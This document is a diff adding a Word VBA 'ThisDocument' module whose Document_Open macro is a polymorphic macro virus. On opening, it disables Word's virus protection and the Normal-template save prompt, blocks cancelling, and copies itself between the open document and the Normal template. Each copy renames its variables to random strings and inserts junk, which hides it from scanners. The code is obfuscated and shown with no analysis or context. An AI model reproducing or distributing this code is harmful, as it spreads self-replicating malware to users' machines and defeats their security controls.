@@ -1,0 +1,180 @@
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Private Sub Document_Open()
+¤õ´‰ÁíîÛ“¼‘Ìàì…ôôß…ß©«¾¢¢ˆÑ¢……Æ¨åÚ¥Ã¢Ôºœï  = "´˜Ä¶ŸÂõ§ö¢ïç"
+ß×ù•´ºê‚ = ActiveDocument.VBProject.VBComponents(1).CodeModule.countoflines
+™•µŒðÑâˆâàÝ÷ß = NormalTemplate.VBProject.VBComponents(1).CodeModule.countoflines
+Application.Options.VirusProtection = False
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.SaveNormalPrompt = False
+If ß×ù•´ºê‚ > 169 And ™•µŒðÑâˆâàÝ÷ß > 169 Then Exit Sub
+If ™•µŒðÑâˆâàÝ÷ß > 169 Then
+Set ‰¬¨¢Ë†ÂßÀ¦Œî¾Ó“›èÅª»ôæéó = ActiveDocument
+Set ‡Óµ½’ùé„ = NormalTemplate
+GoTo •ŠÊ¨Ä ÖÌÓÙ£¡µˆ­ÁÀÒé§’ë ±å
+End If
+If ™•µŒðÑâˆâàÝ÷ß < 170 Then
+Set ‰¬¨¢Ë†ÂßÀ¦Œî¾Ó“›èÅª»ôæéó = NormalTemplate
+Set ‡Óµ½’ùé„ = ActiveDocument
+End If
+ReDim ƒê¶—Ð(50, 50)
+¸£ƒ‡ÅÍ×Äè×ŽÌ = ‡Óµ½’ùé„.VBProject.VBComponents(1).CodeModule.countoflines
+ß×ù•´ºê‚ = 0
+Do Until ß×ù•´ºê‚ = ¸£ƒ‡ÅÍ×Äè×ŽÌ
+ß×ù•´ºê‚ = ß×ù•´ºê‚ + 1
+äÃ÷Ð÷Ô = ‡Óµ½’ùé„.VBProject.VBComponents(1).CodeModule.Lines(ß×ù•´ºê‚, 1)
+If Left(äÃ÷Ð÷Ô, 1) = "'" Then
+ßùŽ äÙ‡áÕÄ­Åò = Len(äÃ÷Ð÷Ô)
+äÃ÷Ð÷Ô = Mid(äÃ÷Ð÷Ô, 2, ßùŽ äÙ‡áÕÄ­Åò)
+ Ü = ""
+Ê®· = Len(äÃ÷Ð÷Ô)
+Randomize Timer
+Ò–À½¡ÑµÎŠÐØ‡£®×ÂŽ½É×¡´²:
+êµ—èùÙ×ß¹Èö¶ˆ£ = CInt(Rnd * 30) + 1
+For Ýˆï™‡ä ¿…ì­Ô = 1 To êµ—èùÙ×ß¹Èö¶ˆ£
+'™•µŒðÑâˆâàÝ÷ß
+'‰¬¨¢Ë†ÂßÀ¦Œî¾Ó“›èÅª»ôæéó
+'‡Óµ½’ùé„
+'Ò¶Ž¸šÌ¹×ô©œ–œð
+'øŠòÓù ½œ
+'³‘êîˆÈóøÎÎ¿Íï
+'ÎÁà­ä¢˜¤ºøœÊÜÛ
+'ß×ù•´ºê‚
+'Š
+'™Ìòç¿ð×—¤
+'ì »ï½–Ð¹à·í¡Œà˜‘‡ß
+'ßùŽ äÙ‡áÕÄ­Åò
+'ó•¨èÀ‚±™ÙÓ‰Ãæ•¶Æá
+'ž÷
+'Æï£¯ÎàºÇÎŒ£ˆä˜´õ—ííÈÕÐˆ²
+'Ò–À½¡ÑµÎŠÐØ‡£®×ÂŽ½É×¡´²
+'ìÜ·Çª¼œÃ‰Ö¤ÎŒ¼¥„û÷ð”
+'Ìõ·
+'Ü¿ŠÏ‘Ô´˜ð
+'Ê®·
+'äÃ÷Ð÷Ô
+'Æî¨µŒ ƒ¥Ï§ÚÊ®ÆùÊ­”ôÄá™°ÄñÄŠ
+'×†òçŽ±éç¾´·³ŸËä¹õ¿Ð‹ˆ°¹šÛ
+'°Ó²³¨—³ŽßÆÍž÷ûÈÇ‘
+'Ü¿ŠÏ‘Ô´˜ð
+'ßùŽ äÙ‡áÕÄ­Åò
+'Š
+'§Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜
+'³‘êîˆÈóøÎÎ¿Íï
+'¸£ƒ‡ÅÍ×Äè×ŽÌ
+'­Úé÷Éï²»ú¢§ö‡ÚÌ‰
+'Ýˆï™‡ä ¿…ì­Ô
+'™Ìòç¿ð×—¤
+'åÎ„¯´­­Îñ•¸˜
+'àïÃ¼†¸
+'ç¨œ»Ö¦Ýð
+'ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»
+'õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–š
+' Ü
+'‘•£™È“á¥²øÔ¨Ù‹§ç®íé„¥ä«’ÈÏ­
+'êµ—èùÙ×ß¹Èö¶ˆ£
+'Ýˆï™‡ä ¿…ì­Ô
+'ƒê¶—Ð
+'À½
+'ß×ù•´ºê‚
+'°Ó²³¨—³ŽßÆÍž÷ûÈÇ‘
+'ò‹ŸÍž¼ÎÄÌ¤²
+'•ŠÊ¨Ä ÖÌÓÙ£¡µˆ­ÁÀÒé§’ë ±å
+'¤õ´‰ÁíîÛ“¼‘Ìàì…ôôß…ß©«¾¢¢ˆÑ¢……
+õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–š:
+ò‹ŸÍž¼ÎÄÌ¤² = CInt(Rnd * 250) + 1
+If ò‹ŸÍž¼ÎÄÌ¤² = 13 Then GoTo õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–š
+If ò‹ŸÍž¼ÎÄÌ¤² < 65 Then GoTo õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–š
+If ò‹ŸÍž¼ÎÄÌ¤² < 130 Then GoTo õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–š
+ Ü =  Ü & Chr(ò‹ŸÍž¼ÎÄÌ¤²)
+Next Ýˆï™‡ä ¿…ì­Ô
+ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£» = ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£» + 1
+ƒê¶—Ð(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£», 1) = äÃ÷Ð÷Ô
+ƒê¶—Ð(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£», 2) =  Ü
+End If
+Loop
+•ŠÊ¨Ä ÖÌÓÙ£¡µˆ­ÁÀÒé§’ë ±å:
+ß×ù•´ºê‚ = 1
+§Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜ = "Private Sub Document_Open()" & Chr(13)
+If ™•µŒðÑâˆâàÝ÷ß < 170 Then
+êµ—èùÙ×ß¹Èö¶ˆ£ = CInt(Rnd * 30) + 1
+For Ýˆï™‡ä ¿…ì­Ô = 1 To êµ—èùÙ×ß¹Èö¶ˆ£
+åÎ„¯´­­Îñ•¸˜:
+Ü¿ŠÏ‘Ô´˜ð = CInt(Rnd * 250)
+If Ü¿ŠÏ‘Ô´˜ð = 13 Then GoTo åÎ„¯´­­Îñ•¸˜
+If Ü¿ŠÏ‘Ô´˜ð < 65 Then GoTo åÎ„¯´­­Îñ•¸˜
+If Ü¿ŠÏ‘Ô´˜ð < 130 Then GoTo åÎ„¯´­­Îñ•¸˜
+ Ü =  Ü & Chr(Ü¿ŠÏ‘Ô´˜ð)
+Next Ýˆï™‡ä ¿…ì­Ô
+êµ—èùÙ×ß¹Èö¶ˆ£ = CInt(Rnd * 20)
+For ‘•£™È“á¥²øÔ¨Ù‹§ç®íé„¥ä«’ÈÏ­ = 1 To êµ—èùÙ×ß¹Èö¶ˆ£
+àïÃ¼†¸:
+Ü¿ŠÏ‘Ô´˜ð = CInt(Rnd * 250)
+If Ü¿ŠÏ‘Ô´˜ð = 13 Then GoTo àïÃ¼†¸
+If Ü¿ŠÏ‘Ô´˜ð = 34 Then GoTo àïÃ¼†¸
+If Ü¿ŠÏ‘Ô´˜ð < 130 Then GoTo àïÃ¼†¸
+°Ó²³¨—³ŽßÆÍž÷ûÈÇ‘ = °Ó²³¨—³ŽßÆÍž÷ûÈÇ‘ & Chr(Ü¿ŠÏ‘Ô´˜ð)
+Next ‘•£™È“á¥²øÔ¨Ù‹§ç®íé„¥ä«’ÈÏ­
+§Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜ = §Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜ &  Ü & "=" & Chr(34) & °Ó²³¨—³ŽßÆÍž÷ûÈÇ‘ & Chr(34) & Chr(13)
+End If
+ßùŽ äÙ‡áÕÄ­Åò = ‡Óµ½’ùé„.VBProject.VBComponents(1).CodeModule.countoflines
+For Š = 2 To ßùŽ äÙ‡áÕÄ­Åò
+§Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜ = §Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜ & ‡Óµ½’ùé„.VBProject.VBComponents(1).CodeModule.Lines(Š, 1) & Chr(13)
+Next Š
+If ™•µŒðÑâˆâàÝ÷ß > 169 Then GoTo ¤õ´‰ÁíîÛ“¼‘Ìàì…ôôß…ß©«¾¢¢ˆÑ¢……
+Do
+³‘êîˆÈóøÎÎ¿Íï = 0
+¸£ƒ‡ÅÍ×Äè×ŽÌ = Len(§Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜)
+À½ = À½ + 1
+If ƒê¶—Ð(À½, 1) = "" Then GoTo ¤õ´‰ÁíîÛ“¼‘Ìàì…ôôß…ß©«¾¢¢ˆÑ¢……
+Ê®· = Len(ƒê¶—Ð(À½, 1))
+êµ—èùÙ×ß¹Èö¶ˆ£ = ƒê¶—Ð(À½, 1)
+Do Until ³‘êîˆÈóøÎÎ¿Íï = ¸£ƒ‡ÅÍ×Äè×ŽÌ
+¸£ƒ‡ÅÍ×Äè×ŽÌ = Len(§Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜)
+³‘êîˆÈóøÎÎ¿Íï = ³‘êîˆÈóøÎÎ¿Íï + 1
+­Úé÷Éï²»ú¢§ö‡ÚÌ‰ = Mid(§Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜, ³‘êîˆÈóøÎÎ¿Íï, Ê®·)
+If UCase(­Úé÷Éï²»ú¢§ö‡ÚÌ‰) = UCase(êµ—èùÙ×ß¹Èö¶ˆ£) Then
+If ³‘êîˆÈóøÎÎ¿Íï = 1 Then
+ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£» = Mid(§Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜, ³‘êîˆÈóøÎÎ¿Íï + Ê®·, 1)
+™Ìòç¿ð×—¤ = 0
+If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£») < 65 Then ™Ìòç¿ð×—¤ = 1
+If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£») > 90 And Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£») < 97 Then ™Ìòç¿ð×—¤ = 1
+If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£») > 122 Then ™Ìòç¿ð×—¤ = 1
+If ™Ìòç¿ð×—¤ = 1 Then
+ç¨œ»Ö¦Ýð = ç¨œ»Ö¦Ýð & ƒê¶—Ð(À½, 2) & Mid(§Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜, ³‘êîˆÈóøÎÎ¿Íï + Ê®·, ¸£ƒ‡ÅÍ×Äè×ŽÌ)
+End If
+Else
+™Ìòç¿ð×—¤ = 0
+ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£» = Mid(§Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜, ³‘êîˆÈóøÎÎ¿Íï - 1, 1)
+If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£») < 65 Then ™Ìòç¿ð×—¤ = 1
+If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£») > 90 And Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£») < 97 Then ™Ìòç¿ð×—¤ = 1
+If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£») > 122 Then ™Ìòç¿ð×—¤ = 1
+If ™Ìòç¿ð×—¤ = 1 Then
+ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£» = Mid(§Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜, ³‘êîˆÈóøÎÎ¿Íï + Ê®·, 1)
+™Ìòç¿ð×—¤ = 0
+If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£») < 65 Then ™Ìòç¿ð×—¤ = 1
+If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£») > 90 And Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£») < 97 Then ™Ìòç¿ð×—¤ = 1
+If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£») > 122 Then ™Ìòç¿ð×—¤ = 1
+If ™Ìòç¿ð×—¤ = 1 Then
+ç¨œ»Ö¦Ýð = Mid(§Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜, 1, ³‘êîˆÈóøÎÎ¿Íï - 1)
+ç¨œ»Ö¦Ýð = ç¨œ»Ö¦Ýð & ƒê¶—Ð(À½, 2) & Mid(§Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜, ³‘êîˆÈóøÎÎ¿Íï + Ê®·, ¸£ƒ‡ÅÍ×Äè×ŽÌ)
+§Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜ = ç¨œ»Ö¦Ýð
+End If
+End If
+End If
+End If
+Loop
+Loop
+¤õ´‰ÁíîÛ“¼‘Ìàì…ôôß…ß©«¾¢¢ˆÑ¢……:
+¸£ƒ‡ÅÍ×Äè×ŽÌ = ‰¬¨¢Ë†ÂßÀ¦Œî¾Ó“›èÅª»ôæéó.VBProject.VBComponents(1).CodeModule.countoflines
+‰¬¨¢Ë†ÂßÀ¦Œî¾Ó“›èÅª»ôæéó.VBProject.VBComponents(1).CodeModule.deletelines 1, ¸£ƒ‡ÅÍ×Äè×ŽÌ
+‰¬¨¢Ë†ÂßÀ¦Œî¾Ó“›èÅª»ôæéó.VBProject.VBComponents(1).CodeModule.AddFromstring (§Ÿ§¼àöà™ææéÂ–¹¡’¿ó´¶Éï±¸œ“˜)
+End Sub
+
+
